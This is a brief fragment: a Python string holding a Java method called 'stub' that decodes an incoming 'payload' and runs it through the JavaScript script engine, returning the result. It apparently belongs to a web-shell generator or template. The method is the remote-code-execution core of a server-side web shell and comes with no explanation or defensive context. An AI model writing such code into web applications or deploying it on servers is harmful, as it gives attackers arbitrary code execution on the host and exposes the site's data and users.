code = """
    private String stub(String payload, Object request, Object response)
            throws Exception {
        if (payload == null) {
            return null;
        }
        payload = decoder(payload);
        String result = (new javax.script.ScriptEngineManager()
                .getEngineByName("js").eval(payload)).toString();
        return result;
    }
"""